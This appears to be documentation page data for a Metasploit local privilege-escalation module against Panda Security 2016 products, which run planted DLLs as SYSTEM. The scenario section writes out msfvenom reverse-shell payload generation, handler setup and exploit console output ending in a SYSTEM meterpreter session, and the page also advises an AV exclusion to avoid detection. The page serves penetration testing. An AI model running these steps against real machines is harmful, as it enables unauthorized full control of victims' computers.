{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/panda_psevents","result":{"data":{"moduleMetadataJson":{"id":"0919bf00-85c6-5d87-b0d3-3e72d70f7b9d","name":"Panda Security PSEvents Privilege Escalation","fullname":"exploit/windows/local/panda_psevents","description":"PSEvents.exe within several Panda Security products runs hourly with SYSTEM privileges.\n        When run, it checks a user writable folder for certain DLL files, and if any are found\n        they are automatically run.\n        Vulnerable Products:\n        Panda Global Protection 2016 (<=16.1.2)\n        Panda Antivirus Pro 2016 (<=16.1.2)\n        Panda Small Business Protection (<=16.1.2)\n        Panda Internet Security 2016 (<=16.1.2)","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/panda_psevents","documentationSlug":"/modules/documentation/exploit/windows/local/panda_psevents"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Panda Antivirus Pro 2016 16.1.2 is available from <a href=\"http://filehippo.com/download_panda_antivirus_pro_2017/download/b436969174c5ca07a27a0aedf6456c89/\">filehippo</a>\nor from an unofficial <a href=\"https://github.com/h00die/MSF-Testing-Scripts/blob/master/Panda_AV_Pro2016_16.1.2.exe\">git</a>.</p>\n<p>  The AV must be running for PSEvents.exe to run and the module to get called, which can take up to an hour.  I 32bit meterpreter seems to get caught,\nso you may need an AV exclusion for the folder to ensure it didn't catch meterpreter in action.</p>\n<p>  The downloads folder can take a 10-15 minutes to appear after install, and its downloaded by Panda AV from the company.</p>\n<ol>\n<li>Theres an HTTP GET request to 23.215.132.154 for /retail/psprofiler/40032/psprofiler_suite.exe</li>\n<li>Then right after HTTP GET request to 23.215.132.154 for /retail/psevents_suite.exe.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Wait for <code class=\"language-text\">C:\\ProgramData\\Panda Security\\Panda Devices Agent\\Downloads</code> folder to appear</li>\n<li>Start msfconsole</li>\n<li>Get a shell</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/local/panda_psevents</code></li>\n<li>Do: <code class=\"language-text\">set session [ID]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>Go do something else while you wait</li>\n<li>Enjoy being system with your shell</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>DLL</strong></p>\n<p>  Which DLL to name our payload.  The original vulnerability writeup utilized bcryptPrimitives.dll, and mentioned several others that could be used.  However the dll seems to be VERY picky.  Default is cryptnet.dll.  See the chart for more details.</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>WINHTTP.dll</th>\n<th>VERSION.dll</th>\n<th>bcryptPrimitives.dll</th>\n<th>CRYPTBASE.dll</th>\n<th>cryptnet.dll</th>\n<th>WININET.dll</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>64bit target (1), win10 x64</td>\n<td>CRASH</td>\n<td>CRASH</td>\n<td>NO</td>\n<td>NO</td>\n<td>valid</td>\n<td>no</td>\n</tr>\n<tr>\n<td>64bit target (1), win8.1 x86</td>\n<td>CRASH</td>\n<td>CRASH</td>\n<td>NO</td>\n<td>valid</td>\n<td>valid</td>\n<td>no</td>\n</tr>\n<tr>\n<td>32bit target (0), win10 x64</td>\n<td>CRASH</td>\n<td>CRASH</td>\n<td>NO</td>\n<td>NO</td>\n<td>valid</td>\n<td>no</td>\n</tr>\n<tr>\n<td>32bit target (0), win8.1 x86</td>\n<td>CRASH</td>\n<td>CRASH</td>\n<td>NO</td>\n<td>valid</td>\n<td>valid (caught by av)</td>\n<td>no</td>\n</tr>\n<tr>\n<td>32bit target (0), win7sp1 x86</td>\n<td></td>\n<td></td>\n<td>valid</td>\n<td></td>\n<td>valid (caught by av)</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>In this chart, <code class=\"language-text\">CRASH</code> means PSEvents.exe crashed on the system.  <code class=\"language-text\">NO</code> means PSEvents didn't crash, but no session was obtained.  <code class=\"language-text\">valid</code> means we got a shell.</p>\n<p>  <strong>ListenerTimeout</strong></p>\n<p>  How long to wait for a shell.  PSEvents.exe runs every hour or so, so the default is 3610 (10sec to account for code execution or other things)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-81-x86-with-panda-antirivus-pro-2016-1612\" style=\"position:relative;\"><a href=\"#windows-81-x86-with-panda-antirivus-pro-2016-1612\" aria-label=\"windows 81 x86 with panda antirivus pro 2016 1612 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 8.1 x86 with Panda Antirivus Pro 2016 16.1.2</h3>\n<p>  Step 1, get a local shell.  I used msfvenom to drop an exe for easy user level meterpreter.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp -f exe -o meterpreter.exe -e x86/shikata_ga_nai -i 1 LHOST=192.168.2.117 LPORT=4449\n\nmsf &gt; use exploit/multi/handler \nmsf exploit(handler) &gt; set payload windows/meterpreter_reverse_tcp \npayload =&gt; windows/meterpreter_reverse_tcp\nmsf exploit(handler) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(handler) &gt; set lport 4449\nlport =&gt; 4449\nmsf exploit(handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4449 \n[*] Starting the payload handler...\n[*] Meterpreter session 1 opened (192.168.2.117:4449 -&gt; 192.168.2.91:63617) at 2016-09-25 20:32:15 -0400\n\nmeterpreter &gt; getuid\nServer username: IE11Win8_1\\IEUser\nmeterpreter &gt; background\n[*] Backgrounding session 1...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Step 2, drop our panda exploit</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/windows/local/panda_psevents\nmsf exploit(panda_psevents) &gt; set session 1\nsession =&gt; 1\nmsf exploit(panda_psevents) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(panda_psevents) &gt; set exitfunc seh\nexitfunc =&gt; seh\nmsf exploit(panda_psevents) &gt; set DLL CRYPTBASE.dll\nDLL =&gt; CRYPTBASE.dll\nmsf exploit(panda_psevents) &gt; show options\n\nModule options (exploit/windows/local/panda_psevents):\n\n   Name             Current Setting  Required  Description\n   ----             ---------------  --------  -----------\n   DLL              CRYPTBASE.dll    yes       dll to create (Accepted: cryptnet.dll, bcryptPrimitives.dll, CRYPTBASE.dll)\n   ListenerTimeout  3610             yes       Number of seconds to wait for the exploit\n   SESSION          1                yes       The session to run this module on.\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  seh              yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     192.168.2.117    yes       The listen address\n   LPORT     4450             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows x86\n\n\n\nmsf exploit(panda_psevents) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4450 \n[*] Uploading the Payload DLL to the filesystem...\n[*] Starting the payload handler, waiting for PSEvents.exe to process folder (up to an hour)...\n[*] Start Time: 2016-09-27 18:10:21 -0400\n[*] Sending stage (957999 bytes) to 192.168.2.91\n[*] Meterpreter session 2 opened (192.168.2.117:4450 -&gt; 192.168.2.91:50022) at 2016-09-27 18:46:15 -0400\n[+] Deleted C:\\ProgramData\\Panda Security\\Panda Devices Agent\\Downloads\\1a2d7253f106c617b45f675e9be08171\\CRYPTBASE.dll\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : IE11WIN8_1\nOS              : Windows 8.1 (Build 9600).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/win32\nmeterpreter &gt; background</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"failed-exploitation-attempts\" style=\"position:relative;\"><a href=\"#failed-exploitation-attempts\" aria-label=\"failed exploitation attempts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Failed Exploitation Attempts</h2>\n<p>If the dll doesn't work, PSEvents.exe will fail to run.  While silent to the user, an error will occur in the Application Windows Logs.</p>\n<ul>\n<li>Event ID: 1000</li>\n<li>Task Category (100)</li>\n<li>Log Name: Application</li>\n<li>Source: Application Error</li>\n<li>\n<p>Details:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Faulting application name: PSEvents.exe, version: 4.0.0.35, time stamp: 0x57061ba6\nFaulting module name: ntdll.dll, version: 6.3.9600.17415, time stamp: 0x54504b06\nException code: 0xc0000374\nFault offset: 0x000d0cf2\nFaulting process id: 0xdd0\nFaulting application start time: 0x01d218a30fbf1ac5\nFaulting application path: C:\\ProgramData\\Panda Security\\Panda Devices Agent\\Downloads\\1a2d7253f106c617b45f675e9be08171\\PSEvents.exe\nFaulting module path: C:\\Windows\\SYSTEM32\\ntdll.dll\nReport Id: 4de7a07e-8496-11e6-9735-000c29e0cffb\nFaulting package full name: \nFaulting package-relative application ID:</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ul>"}}},"pageContext":{"id":"0919bf00-85c6-5d87-b0d3-3e72d70f7b9d"}}}